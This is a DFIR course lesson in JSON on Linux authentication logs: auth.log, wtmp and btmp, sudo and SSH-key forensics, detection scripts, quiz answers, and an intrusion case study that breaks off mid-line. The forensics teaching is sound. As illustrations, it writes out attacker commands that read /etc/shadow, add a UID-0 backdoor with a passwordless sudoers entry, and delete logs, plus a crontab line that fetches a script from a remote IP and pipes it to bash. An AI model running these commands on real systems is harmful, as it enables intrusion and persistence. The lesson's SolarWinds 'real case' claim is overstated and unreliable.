{
  "lesson_id": "910fd056-220d-4528-b40d-b513b399e26c",
  "domain": "dfir",
  "title": "Linux Authentication and Security Logs",
  "difficulty": 2,
  "order_index": 76,
  "prerequisites": [
    "e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8a9b"
  ],
  "concepts": [
    "Authentication log analysis (auth.log, secure)",
    "Failed login detection and brute force analysis",
    "Successful authentication tracking",
    "SSH key authentication forensics",
    "sudo command logging and analysis",
    "User session tracking (wtmp, btmp, lastlog)",
    "PAM authentication framework",
    "Log rotation and retention",
    "Centralized logging with rsyslog/syslog-ng"
  ],
  "estimated_time": 55,
  "learning_objectives": [
    "Master analysis of Linux authentication logs across distributions",
    "Detect brute force attacks and unauthorized access attempts",
    "Track user login sessions and sudo command usage",
    "Understand PAM authentication flow and its forensic artifacts",
    "Analyze SSH authentication including key-based access",
    "Reconstruct attacker authentication timelines from log data"
  ],
  "post_assessment": [
    {
      "question": "Which log file contains authentication events on Debian/Ubuntu systems?",
      "options": [
        "/var/log/messages",
        "/var/log/auth.log",
        "/var/log/secure",
        "/var/log/syslog"
      ],
      "correct_answer": 1,
      "explanation": "Debian/Ubuntu use /var/log/auth.log for authentication events. RHEL/CentOS use /var/log/secure. Understanding distribution differences is critical for forensics.",
      "question_id": "e144d1c6-c735-463b-b699-d62eac3ed38b",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "What command shows the last login time for all users?",
      "options": [
        "last",
        "lastlog",
        "who",
        "w"
      ],
      "correct_answer": 1,
      "explanation": "lastlog reads /var/log/lastlog and shows the last login time for ALL users. 'last' shows login history from wtmp. 'who' and 'w' show currently logged-in users only.",
      "question_id": "b38c1076-b740-4eb9-bc21-8ffdc88fbddc",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "Which file records failed login attempts?",
      "options": [
        "/var/log/wtmp",
        "/var/log/btmp",
        "/var/log/lastlog",
        "/var/log/utmp"
      ],
      "correct_answer": 1,
      "explanation": "/var/log/btmp records failed login attempts (bad logins). wtmp records successful logins, utmp tracks current sessions, and lastlog stores last login per user.",
      "question_id": "8120822e-66de-4e73-aa7a-9722220c5e47",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "What does 'sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash' indicate?",
      "options": [
        "Failed sudo attempt",
        "User ran bash as root via sudo",
        "User logged in as root",
        "Automated script execution"
      ],
      "correct_answer": 1,
      "explanation": "This log entry shows user successfully executed 'sudo /bin/bash', gaining a root shell. The TTY, working directory, and command are all logged for forensic purposes.",
      "question_id": "6ec011db-088f-4821-a5b2-3e3e0d362863",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "In SSH logs, what does 'Accepted publickey for user from IP' mean?",
      "options": [
        "Password authentication succeeded",
        "SSH key authentication succeeded",
        "Two-factor authentication used",
        "Certificate authentication used"
      ],
      "correct_answer": 1,
      "explanation": "'Accepted publickey' means SSH key-based authentication succeeded (not password). This is important for forensics as it indicates authorized_keys file was used.",
      "question_id": "441cff4f-d2e5-40ad-b65f-fe12dfdc20d9",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "minimum_effective_dose",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "## Welcome to Authentication Log Forensics! 🔐\n\n**Here's a powerful truth**: While attackers can clear command history, disable logging, and cover their tracks... they **cannot login without creating log entries**.\n\nAuthentication logs are like the **sign-in sheet at a crime scene**. Every login attempt, successful or failed, leaves a trace.\n\n**Why authentication logs are forensic gold**:\n\n✅ **Can't be easily disabled** (PAM requires them)\n✅ **Timestamp every authentication event** (timeline reconstruction)\n✅ **Record source IPs** (attribution and lateral movement tracking)\n✅ **Log sudo usage** (privilege escalation detection)\n✅ **Survive most attacker cleanup attempts** (often overlooked or rotated to separate files)\n\n**Real case**: 2021 SolarWinds breach investigation relied heavily on authentication logs to:\n- Identify initial compromised accounts\n- Track lateral movement across 18,000+ organizations\n- Determine persistence mechanisms\n- Attribute activity to specific threat actors\n\n**What you'll master in this lesson**:\n- Reading auth.log/secure like a detective novel\n- Spotting brute force attacks in seconds\n- Tracking user sessions from login to logout\n- Analyzing SSH key usage forensically\n- Detecting privilege escalation via sudo logs\n\n**The challenge**: Different Linux distributions use different log files and formats. You'll learn to handle them all.\n\nLet's decode the authentication trail! 🚀"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Linux Authentication Logging Architecture\n\n## Distribution-Specific Log Files\n\n**Critical forensic knowledge**: Log file locations vary by distribution!\n\n```\n┌──────────────────┬─────────────────┬──────────────────┐\n│ Distribution     │ Auth Logs       │ All Logs         │\n├──────────────────┼─────────────────┼──────────────────┤\n│ Debian/Ubuntu    │ /var/log/       │ /var/log/syslog  │\n│                  │ auth.log        │                  │\n├──────────────────┼─────────────────┼──────────────────┤\n│ RHEL/CentOS/     │ /var/log/secure │ /var/log/        │\n│ Fedora           │                 │ messages         │\n├──────────────────┼─────────────────┼──────────────────┤\n│ Arch Linux       │ /var/log/       │ journalctl       │\n│                  │ auth.log        │ (systemd)        │\n├──────────────────┼─────────────────┼──────────────────┤\n│ systemd-based    │ journalctl      │ journalctl       │\n│ (modern)         │ -u sshd         │                  │\n└──────────────────┴─────────────────┴──────────────────┘\n```\n\n**Forensic workflow**: Always check BOTH locations!\n\n```bash\n# Quick check - which exists?\nls -lh /var/log/auth.log 2>/dev/null && echo \"Debian/Ubuntu\"\nls -lh /var/log/secure 2>/dev/null && echo \"RHEL/CentOS\"\njournalctl --version 2>/dev/null && echo \"systemd-based\"\n```bash\n\n## Key Log Files for Authentication Forensics\n\n### 1. /var/log/auth.log or /var/log/secure\n\n**Content**: All authentication-related events\n- SSH logins (successful and failed)\n- Local console logins\n- sudo command usage\n- su (switch user) attempts\n- PAM authentication events\n- User/group modifications\n- cron job executions\n\n**Format**: Standard syslog format\n```\nTimestamp Hostname Process[PID]: Message\n```\n\n**Example entries**:\n```\nOct 15 14:23:45 web-01 sshd[12345]: Accepted password for alice from 192.168.1.50 port 54321 ssh2\nOct 15 14:24:12 web-01 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash\nOct 15 14:30:22 web-01 sshd[12389]: Failed password for invalid user admin from 45.123.67.89 port 12345 ssh2\n```\n\n**Rotation**: Typically daily or weekly\n- Current: `/var/log/auth.log`\n- Rotated: `/var/log/auth.log.1`, `/var/log/auth.log.2.gz`, etc.\n\n### 2. /var/log/wtmp (Binary)\n\n**Content**: Successful login sessions\n- Username\n- Terminal/TTY\n- Source IP\n- Login timestamp\n- Logout timestamp (if available)\n\n**Format**: Binary (not human-readable)\n\n**Read with**:\n```bash\nlast               # Shows recent logins\nlast -f /var/log/wtmp  # Explicit file\nlast -F            # Full timestamps\nlast username      # Filter by user\nlast -i            # Show IPs instead of hostnames\n```\n\n**Example output**:\n```\nalice    pts/0    192.168.1.50     Mon Oct 15 14:23 - 18:45  (04:22)\nroot     tty1                      Mon Oct 15 08:00   still logged in\nhacker   pts/1    45.123.67.89     Sun Oct 14 03:47 - 03:52  (00:05)\n```\n\n**Forensic value**: \n- Timeline of legitimate and attacker sessions\n- Session duration analysis\n- Correlation with other artifacts\n\n### 3. /var/log/btmp (Binary)\n\n**Content**: **Failed** login attempts\n- Failed username (including non-existent users)\n- Source IP\n- Timestamp\n\n**Read with**:\n```bash\nlastb              # Show failed logins\nlastb | head -50   # Recent failures\nlastb | awk '{print $3}' | sort | uniq -c | sort -rn  # Top attacking IPs\n```\n\n**Example output**:\n```\nadmin    ssh:notty    45.123.67.89    Mon Oct 15 03:45 - 03:45  (00:00)\nroot     ssh:notty    45.123.67.89    Mon Oct 15 03:45 - 03:45  (00:00)\ntest     ssh:notty    45.123.67.89    Mon Oct 15 03:46 - 03:46  (00:00)\n```\n\n**Forensic value**:\n- Brute force attack detection\n- Attacker reconnaissance (what usernames did they try?)\n- Attribution (source IPs)\n\n### 4. /var/log/lastlog (Binary)\n\n**Content**: Last login time for **each user**\n- User's last successful login\n- Source IP/hostname\n- Terminal used\n\n**Read with**:\n```bash\nlastlog            # Show all users\nlastlog -u alice   # Specific user\nlastlog -t 7       # Logins in last 7 days\n```\n\n**Example output**:\n```\nUsername         Port     From             Latest\nroot             pts/0    192.168.1.100    Mon Oct 15 08:00:00 +0000 2023\nalice            pts/1    192.168.1.50     Mon Oct 15 14:23:00 +0000 2023\nhacker           pts/2    45.123.67.89     Sun Oct 14 03:47:00 +0000 2023\nsvc-account                                **Never logged in**\n```\n\n**Forensic value**:\n- Quick identification of recently accessed accounts\n- Detection of compromised service accounts (should never login)\n- Unusual login sources\n\n### 5. /var/run/utmp (Binary)\n\n**Content**: **Currently logged-in** users\n- Active sessions only\n- Real-time data\n\n**Read with**:\n```bash\nwho                # Currently logged users\nw                  # Detailed (what they're doing)\nusers              # Just usernames\n```\n\n**Example output**:\n```bash\n$ who\nalice    pts/0        2023-10-15 14:23 (192.168.1.50)\nroot     tty1         2023-10-15 08:00\nhacker   pts/1        2023-10-15 16:30 (45.123.67.89)  ← ACTIVE ATTACKER!\n\n$ w\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nalice    pts/0    192.168.1.50     14:23    5.00s  0.12s  0.00s w\nhacker   pts/1    45.123.67.89     16:30    0.00s  0.45s  0.02s bash\n```\n\n**Forensic value**: \n- Live incident response (detect active attacker)\n- Session correlation with processes\n\n## Understanding PAM Authentication\n\n**PAM (Pluggable Authentication Modules)** = Linux's authentication framework\n\n**Why it matters for forensics**: ALL authentication flows through PAM, generating logs.\n\n**PAM configuration**: `/etc/pam.d/`\n\n```bash\nls /etc/pam.d/\n# Output:\ncommon-auth        # How to authenticate\ncommon-password    # Password policies\ncommon-session     # Session setup\nsshd               # SSH-specific rules\nsudo               # Sudo-specific rules\nlogin              # Console login rules\n```\n\n**Example /etc/pam.d/sshd**:\n```\nauth    required     pam_unix.so       # Use Unix passwords\naccount required     pam_unix.so       # Check account status\nsession required     pam_limits.so     # Apply resource limits\nsession required     pam_env.so        # Set environment\n```\n\n**PAM generates log entries**:\n```\nOct 15 14:23:45 web-01 sshd[12345]: pam_unix(sshd:session): session opened for user alice by (uid=0)\nOct 15 14:23:50 web-01 sudo: pam_unix(sudo:auth): authentication failure; logname=alice uid=1000 euid=0 tty=/dev/pts/0 ruser=alice rhost=  user=alice\n```\n\n**Forensic analysis of PAM logs**:\n- `session opened` = successful login\n- `authentication failure` = wrong password\n- `account expired` = account locked/expired\n- `maximum number of tries exceeded` = brute force\n\n## SSH Authentication Deep Dive\n\n**SSH logs to**: auth.log/secure AND syslog\n\n**Log entry anatomy**:\n```\nOct 15 14:23:45 web-01 sshd[12345]: Accepted password for alice from 192.168.1.50 port 54321 ssh2\n│               │      │           │        │           │       │                  │          │\n│               │      │           │        │           │       │                  │          └─ Protocol version\n│               │      │           │        │           │       │                  └─ Source port\n│               │      │           │        │           │       └─ Source IP\n│               │      │           │        │           └─ Username\n│               │      │           │        └─ Auth method (password, publickey, keyboard-interactive)\n│               │      │           └─ Success/failure\n│               │      └─ Process and PID\n│               └─ Hostname\n└─ Timestamp\n```\n\n**SSH authentication methods**:\n\n1. **Password authentication**:\n```\nAccepted password for alice from 192.168.1.50 port 54321 ssh2\n```\n\n2. **Public key authentication**:\n```\nAccepted publickey for alice from 192.168.1.50 port 54321 ssh2: RSA SHA256:abc123...\n```\n- Key fingerprint logged (for attribution)\n- Check `~/.ssh/authorized_keys` for key details\n\n3. **Failed attempts**:\n```\nFailed password for alice from 45.123.67.89 port 12345 ssh2\nFailed password for invalid user admin from 45.123.67.89 port 12345 ssh2\n```\n\n**Forensic significance**:\n- `Accepted publickey` = Check authorized_keys (attacker may have added key)\n- `invalid user` = Reconnaissance (attacker testing usernames)\n- Multiple failures from same IP = Brute force\n- Success after failures = Successful brute force\n\n## Sudo Command Logging\n\n**Every sudo command logged to auth.log/secure**\n\n**Log format**:\n```\nOct 15 14:24:12 web-01 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash\n│      │       │           │                │           │\n│      │       │           │                │           └─ Command executed\n│      │       │           │                └─ Target user (usually root)\n│      │       │           └─ Working directory\n│      │       └─ Terminal\n│      └─ User who ran sudo\n└─ Process\n```\n\n**Forensic value**: **Complete audit trail of privileged actions**\n\n**Common attacker patterns**:\n```bash\n# Privilege escalation\nsudo su -\nsudo /bin/bash\nsudo -i\n\n# Reconnaissance\nsudo cat /etc/shadow\nsudo find / -name \"*password*\"\n\n# Persistence\nsudo useradd backdoor\nsudo usermod -aG sudo backdoor\nsudo crontab -e\n\n# Cleanup attempts\nsudo rm /var/log/auth.log\nsudo history -c\n```\n\n**Searching sudo logs**:\n```bash\n# All sudo commands by user\ngrep \"sudo:.*alice\" /var/log/auth.log\n\n# Failed sudo attempts\ngrep \"sudo.*authentication failure\" /var/log/auth.log\n\n# Specific commands\ngrep \"sudo.*COMMAND=/bin/bash\" /var/log/auth.log\n```bash\n\n## Log Rotation and Retention\n\n**Default retention**: 4-7 weeks (varies)\n\n**Rotation configuration**: `/etc/logrotate.d/rsyslog`\n\n```\n/var/log/auth.log {\ndaily              # Rotate daily\nrotate 7           # Keep 7 rotations\ncompress           # Compress old logs (.gz)\ndelaycompress      # Don't compress most recent\nmissingok          # Don't error if missing\nnotifempty         # Don't rotate if empty\n}\n```\n\n**Rotated files**:\n```\n/var/log/auth.log         ← Current\n/var/log/auth.log.1       ← Yesterday\n/var/log/auth.log.2.gz    ← 2 days ago (compressed)\n/var/log/auth.log.3.gz\n...\n```\n\n**Forensic tip**: **Always check rotated logs!**\n\n```bash\n# Search current log\ngrep \"hacker\" /var/log/auth.log\n\n# Search all rotated logs (including compressed)\nzgrep \"hacker\" /var/log/auth.log*\n```bash\n\n## systemd Journal (Modern Systems)\n\n**systemd** uses `journalctl` instead of/in addition to text logs\n\n**Advantages**:\n- Binary format (tamper-evident)\n- Indexed (fast searches)\n- Rich metadata\n- Unified logging\n\n**Basic usage**:\n```bash\n# All authentication logs\njournalctl -u sshd\njournalctl -u ssh\njournalctl _COMM=sshd\n\n# Time-based filtering\njournalctl --since \"2023-10-15 00:00:00\" --until \"2023-10-15 23:59:59\"\njournalctl --since \"1 hour ago\"\njournalctl --since today\n\n# Follow live\njournalctl -u sshd -f\n\n# Priority filtering\njournalctl -p err     # Errors only\njournalctl -p warning # Warnings and above\n\n# Export to text\njournalctl -u sshd > ssh_logs.txt\n```\n\n**Forensic analysis**:\n```bash\n# Failed SSH attempts\njournalctl _COMM=sshd | grep \"Failed password\"\n\n# Successful logins\njournalctl _COMM=sshd | grep \"Accepted\"\n\n# Sudo usage\njournalctl _COMM=sudo\n\n# All authentication for specific user\njournalctl | grep \"alice\"\n```\n\n**Persistence location**: `/var/log/journal/`\n\n```bash\nls /var/log/journal/\n# Binary files - use journalctl, not cat!\n```"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: Authentication Log Forensics\n\n## Exercise 1: Brute Force Detection\n\n**Scenario**: Detect SSH brute force attacks from logs.\n\n**Method 1: Count failed attempts per IP**\n```bash\n# Debian/Ubuntu\ngrep \"Failed password\" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20\n\n# RHEL/CentOS\ngrep \"Failed password\" /var/log/secure | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20\n\n# Output:\n#  1247 45.123.67.89    ← 1,247 failed attempts!\n#   89 192.168.1.200\n#   12 10.0.0.50\n```\n\n**Method 2: Show timeline of attempts**\n```bash\n# Failed attempts from specific IP\ngrep \"Failed password.*45.123.67.89\" /var/log/auth.log | head -20\n\n# Output shows:\nOct 15 03:45:01 web-01 sshd[10001]: Failed password for invalid user admin from 45.123.67.89\nOct 15 03:45:03 web-01 sshd[10002]: Failed password for invalid user root from 45.123.67.89\nOct 15 03:45:05 web-01 sshd[10003]: Failed password for invalid user test from 45.123.67.89\n# Pattern: Every 2 seconds = automated attack\n```\n\n**Method 3: Check if attack succeeded**\n```bash\n# Did attacker eventually succeed?\ngrep \"45.123.67.89\" /var/log/auth.log | grep \"Accepted\"\n\n# If you see output:\nOct 15 03:52:17 web-01 sshd[10234]: Accepted password for alice from 45.123.67.89\n# ↑ Successful brute force! Incident confirmed.\n```\n\n**Method 4: Automated brute force detector script**\n```bash\n# !/bin/bash\n# detect_bruteforce.sh\n\nLOGFILE=\"/var/log/auth.log\"\nTHRESHOLD=10  # Alert if >10 failures from one IP\n\necho \"[*] Analyzing SSH brute force attempts...\"\necho \"\"\n\n# Count failures per IP\ngrep \"Failed password\" \"$LOGFILE\" 2>/dev/null | \\\nawk '{print $(NF-3)}' | \\\nsort | uniq -c | sort -rn | \\\nwhile read count ip; do\nif [ $count -gt $THRESHOLD ]; then\necho \"[!] ALERT: $ip - $count failed attempts\"\n\n# Check if this IP eventually succeeded\nif grep -q \"Accepted.*$ip\" \"$LOGFILE\"; then\necho \"    [!!] CRITICAL: This IP later succeeded!\"\ngrep \"Accepted.*$ip\" \"$LOGFILE\" | head -3 | sed 's/^/    /'\nfi\n\n# Show attempted usernames\necho \"    Attempted usernames:\"\ngrep \"Failed password.*$ip\" \"$LOGFILE\" | \\\ngrep -oP 'for (invalid user )?\\K[^ ]+' | \\\nsort | uniq -c | sort -rn | head -5 | sed 's/^/      /'\necho \"\"\nfi\ndone\n\necho \"[*] Analysis complete\"\n```\n\n---\n\n## Exercise 2: Track User Login Sessions\n\n**Scenario**: Reconstruct all login activity for user \"alice\".\n\n**Step 1: Successful logins (wtmp)**\n```bash\n# Show all logins for alice\nlast alice\n\n# With full timestamps\nlast -F alice\n\n# Show IPs instead of hostnames\nlast -i alice\n\n# Output:\nalice pts/0   192.168.1.50   Mon Oct 15 14:23 - 18:45  (04:22)\nalice pts/1   192.168.1.50   Sun Oct 14 09:15 - 17:30  (08:15)\nalice pts/0   10.0.0.25      Fri Oct 12 11:00 - 15:22  (04:22)\n```\n\n**Step 2: Failed login attempts (btmp)**\n```bash\n# Failed logins for alice\nlastb alice\n\n# Output (if any):\nalice ssh:notty  45.123.67.89   Mon Oct 15 03:47 - 03:47  (00:00)\n# Indicates someone tried to brute force alice's account\n```\n\n**Step 3: Last login (lastlog)**\n```bash\n# When did alice last login?\nlastlog -u alice\n\n# Output:\nUsername  Port     From             Latest\nalice     pts/0    192.168.1.50     Mon Oct 15 14:23:00 +0000 2023\n```\n\n**Step 4: Detailed authentication events (auth.log)**\n```bash\n# All SSH activity for alice\ngrep \"sshd.*alice\" /var/log/auth.log\n\n# Just successful logins\ngrep \"Accepted.*alice\" /var/log/auth.log\n\n# Session open/close\ngrep \"session.*alice\" /var/log/auth.log\n```\n\n**Step 5: Sudo usage by alice**\n```bash\n# All sudo commands\ngrep \"sudo:.*alice\" /var/log/auth.log\n\n# Specific command types\ngrep \"sudo:.*alice.*COMMAND=/bin/bash\" /var/log/auth.log\ngrep \"sudo:.*alice.*COMMAND=.*useradd\" /var/log/auth.log\n```\n\n---\n\n## Exercise 3: SSH Key Authentication Forensics\n\n**Scenario**: User logged in via SSH key. Determine which key was used.\n\n**Step 1: Find public key login in logs**\n```bash\n# Search for publickey authentication\ngrep \"Accepted publickey\" /var/log/auth.log\n\n# Output:\nOct 15 16:30:12 web-01 sshd[15234]: Accepted publickey for hacker from 45.123.67.89 port 54321 ssh2: RSA SHA256:abc123def456...\n```\n\n**Step 2: Extract key fingerprint**\n```bash\n# The SHA256:abc123def456... is the key fingerprint\n# Save it:\nKEY_FP=\"SHA256:abc123def456...\"\n```\n\n**Step 3: Find matching key in authorized_keys**\n```bash\n# Check user's authorized_keys\nsudo cat /home/hacker/.ssh/authorized_keys\n\n# Generate fingerprints for all keys\nwhile read key; do\necho \"$key\" | ssh-keygen -lf -\ndone < /home/hacker/.ssh/authorized_keys\n\n# Output:\n2048 SHA256:abc123def456... no comment (RSA)\n2048 SHA256:xyz789abc123... alice@workstation (RSA)\n```\n\n**Step 4: Check when key was added**\n```bash\n# File modification time\nsudo stat /home/hacker/.ssh/authorized_keys\n\n# If recently modified (during intrusion timeframe):\n# = Attacker added their own key for persistence!\n```\n\n**Step 5: Examine the suspicious key**\n```bash\nsudo cat /home/hacker/.ssh/authorized_keys\n\n# Look for:\n# - Keys without comments (suspicious)\n# - Keys with generic comments (suspicious)\n# - Keys added to service accounts (VERY suspicious)\n\n# Example suspicious entry:\nssh-rsa AAAAB3NzaC1yc2EA... (no comment)\n# Legitimate keys usually have comments:\nssh-rsa AAAAB3NzaC1yc2EA... alice@alice-laptop\n```\n\n---\n\n## Exercise 4: Sudo Command Timeline\n\n**Scenario**: Investigate privilege escalation by analyzing sudo logs.\n\n**Commands to analyze sudo usage**:\n```bash\n# All sudo commands chronologically\ngrep \"sudo:\" /var/log/auth.log | grep \"COMMAND\"\n\n# Failed sudo attempts (wrong password)\ngrep \"sudo:\" /var/log/auth.log | grep \"authentication failure\"\n\n# Successful sudo to root shell\ngrep \"sudo:.*COMMAND=/bin/bash\\|COMMAND=/bin/sh\\|sudo su\" /var/log/auth.log\n\n# User/group manipulation via sudo\ngrep \"sudo:.*useradd\\|usermod\\|groupadd\\|groupmod\" /var/log/auth.log\n\n# Sudoers file modifications\ngrep \"sudo:.*visudo\\|/etc/sudoers\" /var/log/auth.log\n```\n\n**Example investigation output**:\n```\nOct 15 14:24:12 web-01 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash\nOct 15 14:25:33 web-01 sudo: alice : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -u 0 -o backdoor\nOct 15 14:26:01 web-01 sudo: alice : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/passwd backdoor\nOct 15 14:27:15 web-01 sudo: alice : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c echo 'backdoor ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/backdoor\n```\n\n**Analysis**:\n1. 14:24 - alice gets root shell via sudo\n2. 14:25 - Creates backdoor account with UID 0 (root privileges!)\n3. 14:26 - Sets password for backdoor account\n4. 14:27 - Adds backdoor to sudoers with no password requirement\n\n**Timeline: 3 minutes from initial access to persistent backdoor!**\n\n---\n\n## Exercise 5: Comprehensive User Activity Report\n\n**Create a complete forensic report for a user**:\n\n```bash\n# !/bin/bash\n# user_activity_report.sh\n\nUSER=\"$1\"\n\nif [ -z \"$USER\" ]; then\necho \"Usage: $0 <username>\"\nexit 1\nfi\n\necho \"======================================\"\necho \"User Activity Report: $USER\"\necho \"Generated: $(date)\"\necho \"======================================\"\necho \"\"\n\necho \"[1] ACCOUNT INFORMATION\"\ngrep \"^$USER:\" /etc/passwd\necho \"\"\n\necho \"[2] LAST LOGIN\"\nlastlog -u \"$USER\"\necho \"\"\n\necho \"[3] LOGIN HISTORY (Last 20)\"\nlast -F \"$USER\" | head -20\necho \"\"\n\necho \"[4] FAILED LOGIN ATTEMPTS\"\nlastb \"$USER\" 2>/dev/null | head -20 || echo \"None or btmp not accessible\"\necho \"\"\n\necho \"[5] SUCCESSFUL SSH LOGINS\"\ngrep \"Accepted.*$USER\" /var/log/auth.log* 2>/dev/null | tail -20\necho \"\"\n\necho \"[6] FAILED SSH ATTEMPTS\"\ngrep \"Failed.*$USER\" /var/log/auth.log* 2>/dev/null | tail -20\necho \"\"\n\necho \"[7] SUDO COMMAND USAGE\"\ngrep \"sudo:.*$USER.*COMMAND\" /var/log/auth.log* 2>/dev/null | tail -20\necho \"\"\n\necho \"[8] FAILED SUDO ATTEMPTS\"\ngrep \"sudo.*$USER.*authentication failure\" /var/log/auth.log* 2>/dev/null | tail -10\necho \"\"\n\necho \"[9] SSH KEY AUTHENTICATION\"\ngrep \"Accepted publickey.*$USER\" /var/log/auth.log* 2>/dev/null | tail -10\necho \"\"\n\necho \"[10] AUTHORIZED SSH KEYS\"\nif [ -f \"/home/$USER/.ssh/authorized_keys\" ]; then\necho \"Key count: $(wc -l < /home/$USER/.ssh/authorized_keys)\"\necho \"Last modified: $(stat -c '%y' /home/$USER/.ssh/authorized_keys)\"\necho \"Fingerprints:\"\nwhile read key; do\necho \"$key\" | ssh-keygen -lf - 2>/dev/null\ndone < \"/home/$USER/.ssh/authorized_keys\"\nelse\necho \"No authorized_keys file found\"\nfi\necho \"\"\n\necho \"======================================\"\necho \"Report Complete\"\necho \"======================================\"\n```\n\n**Usage**:\n```bash\nsudo ./user_activity_report.sh alice > alice_activity_report.txt\n```\n\n---\n\n## Exercise 6: Real-Time Monitoring\n\n**Monitor authentication events live**:\n\n```bash\n# Watch auth.log in real-time\nsudo tail -f /var/log/auth.log\n\n# Filter for SSH only\nsudo tail -f /var/log/auth.log | grep sshd\n\n# Filter for failures only\nsudo tail -f /var/log/auth.log | grep \"Failed\"\n\n# Filter for successful logins\nsudo tail -f /var/log/auth.log | grep \"Accepted\"\n\n# Watch sudo usage\nsudo tail -f /var/log/auth.log | grep sudo\n\n# systemd journal (live)\njournalctl -u sshd -f\n```\n\n**Alert on suspicious activity**:\n```bash\n# !/bin/bash\n# realtime_alert.sh - Alert on suspicious auth events\n\nsudo tail -f /var/log/auth.log | while read line; do\n# Alert on failed password\nif echo \"$line\" | grep -q \"Failed password\"; then\necho \"[!] FAILED LOGIN: $line\"\n# Could send email, Slack notification, etc.\nfi\n\n# Alert on successful login from unexpected IP\nif echo \"$line\" | grep -q \"Accepted\"; then\nIP=$(echo \"$line\" | grep -oE \"from [0-9.]+\" | awk '{print $2}')\nif ! echo \"$IP\" | grep -qE \"^(192.168|10.)\"; then\necho \"[!!] EXTERNAL LOGIN: $line\"\nfi\nfi\n\n# Alert on sudo to root shell\nif echo \"$line\" | grep -qE \"sudo.*COMMAND=/bin/(bash|sh)\"; then\necho \"[!!] ROOT SHELL VIA SUDO: $line\"\nfi\ndone\n```\n\n---\n\n## Key Takeaways\n\n✅ **Always check both auth.log/secure AND wtmp/btmp**\n✅ **Failed attempts (btmp) can reveal brute force attacks**\n✅ **Sudo logs provide complete privilege escalation audit trail**\n✅ **SSH key authentication = Check authorized_keys for persistence**\n✅ **Use zgrep to search rotated/compressed logs**\n✅ **Cross-reference authentication logs with command history**\n\nAuthentication logs are your most reliable forensic artifact - master them!"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Case: Detecting Advanced Persistent Threat\n\n## Background\n\nFinancial services company detected unusual database queries. Security team engaged for forensic investigation.\n\n## Initial Findings\n\n**Suspicious account activity**:\n```bash\n$ lastlog | grep -v \"Never logged in\"\nUsername    Port     From             Latest\nroot        pts/0    10.0.0.50        Oct 15 08:00:00\nalice       pts/1    192.168.1.50     Oct 15 14:23:00\nsvc-db      pts/2    45.123.67.89     Oct 14 03:47:00  ← SERVICE ACCOUNT LOGIN!\n```\n\n**Red flag**: Service account `svc-db` should **never** have interactive login!\n\n## Deep Dive Investigation\n\n**Step 1: Check all logins for svc-db**\n```bash\n$ sudo last svc-db\nsvc-db pts/2   45.123.67.89    Sun Oct 14 03:47 - 03:52  (00:05)\nsvc-db pts/3   45.123.67.89    Mon Oct 15 16:30   still logged in\n```\n\nTwo sessions from same external IP - persistence established.\n\n**Step 2: Analyze authentication logs**\n```bash\n$ sudo grep \"svc-db\" /var/log/auth.log*\n\n# Initial compromise:\nOct 14 03:45:01 db-01 sshd[10001]: Failed password for svc-db from 45.123.67.89\nOct 14 03:45:15 db-01 sshd[10002]: Failed password for svc-db from 45.123.67.89\n...\n(127 failed attempts)\n...\nOct 14 03:47:23 db-01 sshd[10128]: Accepted password for svc-db from 45.123.67.89\n```\n\n**Finding**: Successful brute force after 127 attempts (weak password!).\n\n**Step 3: Track privilege escalation**\n```bash\n$ sudo grep \"sudo:.*svc-db\" /var/log/auth.log\n\nOct 14 03:48:01 db-01 sudo: svc-db : TTY=pts/2 ; PWD=/home/svc-db ; USER=root ; COMMAND=/bin/bash\nOct 14 03:49:12 db-01 sudo: svc-db : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/crontab -e\nOct 14 03:50:33 db-01 sudo: svc-db : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/vi /home/svc-db/.ssh/authorized_keys\n```\n\n**Analysis**:\n- 03:48 - Escalated to root via sudo (svc-db had sudo privileges - misconfiguration!)\n- 03:49 - Modified root crontab (persistence mechanism #1)\n- 03:50 - Added SSH key to authorized_keys (persistence mechanism #2)\n\n**Step 4: Check for SSH key persistence**\n```bash\n$ sudo cat /home/svc-db/.ssh/authorized_keys\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... svc-db@localhost  ← Original key\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... (no comment)       ← ATTACKER KEY!\n\n$ sudo stat /home/svc-db/.ssh/authorized_keys\n...\nModify: 2023-10-14 03:50:33.000000000 +0000  ← Matches sudo log timestamp!\n```\n\n**Step 5: Check crontab persistence**\n```bash\n$ sudo crontab -l\n# Normal backup job\n0 2 * * * /usr/local/bin/backup.sh\n\n# MALICIOUS ENTRY (added by attacker):\n*/10 * * * * curl http://45.123.67.89:8080/c | bash 2>/dev/null\n```\n\nEvery 10 minutes, downloads and executes remote script (command & control!).\n\n**Step 6: Check second session**\n```bash\n$ sudo grep \"Oct 15 16:30\" /var/log/auth.log\n\nOct 15 16:30:12 db-01 sshd[25123]: Accepted 